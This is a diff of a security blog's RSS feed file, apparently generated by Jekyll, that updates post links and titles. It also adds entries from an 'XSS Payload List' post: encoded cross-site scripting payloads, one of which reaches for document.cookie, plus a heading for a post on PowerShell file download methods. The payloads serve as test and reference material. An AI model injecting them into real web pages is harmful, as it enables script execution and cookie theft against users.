 &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript://comment%0a%0dalert(/xss/);&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; Click Me&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;input type=&quot;text&quot; name=&quot;param&quot; value=&quot;XSS&quot;%0D&amp;lt;body='X' onmouseover=setInterval`alert\x28&amp;amp;#100;&amp;amp;#111;&amp;amp;#99;&amp;amp;#117;&amp;amp;#109;&amp;amp;#101;&amp;amp;#110;&amp;amp;#116;&amp;amp;#46;&amp;amp;#99;&amp;amp;#111;&amp;amp;#111;&amp;amp;#107;&amp;amp;#105;&amp;amp;#101;\x29`//
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;details/open/ontoggle=window.alert`1`&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;\u0061\u006C\u0065\u0072\u0074(123)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
         <pubDate>Sun, 14 Apr 2019 18:00:00 +0800</pubDate>
-        <link>http://localhost:4000//blog/XSS-Payload-List/</link>
-        <guid isPermaLink="true">http://localhost:4000//blog/XSS-Payload-List/</guid>
+        <link>http://0.0.0.0:80//blog/XSS-Payload-List/</link>
+        <guid isPermaLink="true">http://0.0.0.0:80//blog/XSS-Payload-List/</guid>
         
         <category>XSS</category>
         
@@ -110,7 +816,7 @@ data:image/x-icon;base64
       </item>
     
       <item>
-        <title>Windows Powershell Download File</title>
+        <title>Windows Powershell下载文件的几种方式</title>
         <description>&lt;h1 id=&quot;下载&quot;&gt;下载：&lt;/h1&gt;
 
 &lt;h3 id=&quot;1-netwebclient&quot;&gt;1. Net.WebClient&lt;/h3&gt;
@@ -140,8 +846,8 @@ data:image/x-icon;base64
 
 </description>
         <pubDate>Thu, 11 Apr 2019 18:00:00 +0800</pubDate>
-        <link>http://localhost:4000//blog/Windows-Powershell-Download-File/</link>
-        <guid isPermaLink="true">http://localhost:4000//blog/Windows-Powershell-Download-File/</guid>
+        <link>http://0.0.0.0:80//blog/Windows-Powershell-Download-File/</link>
+        <guid isPermaLink="true">http://0.0.0.0:80//blog/Windows-Powershell-Download-File/</guid>
         
         <category>Powershell</category>
         
@@ -191,15 +897,15 @@ ZSH_THEME_GIT_PROMPT_CLEAN=&quot;&quot;
 
 &lt;h2 id=&quot;links&quot;&gt;Links&lt;/h2&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0]: http://localhost:4000/images/posts/2017/01.png
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0]: http://0.0.0.0:80/images/posts/2017/01.png
 [1]: http://ohmyz.sh/
-[2]: http://localhost:4000/images/posts/2017/02.jpg
+[2]: http://0.0.0.0:80/images/posts/2017/02.jpg
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 </description>
         <pubDate>Sun, 01 Jan 2017 20:00:00 +0800</pubDate>
-        <link>http://localhost:4000//blog/arch-linux-tmux/</link>
-        <guid isPermaLink="true">http://localhost:4000//blog/arch-linux-tmux/</guid>
+        <link>http://0.0.0.0:80//blog/arch-linux-tmux/</link>
+        <guid isPermaLink="true">http://0.0.0.0:80//blog/arch-linux-tmux/</guid>
         
         <category>archlinux</category>
         
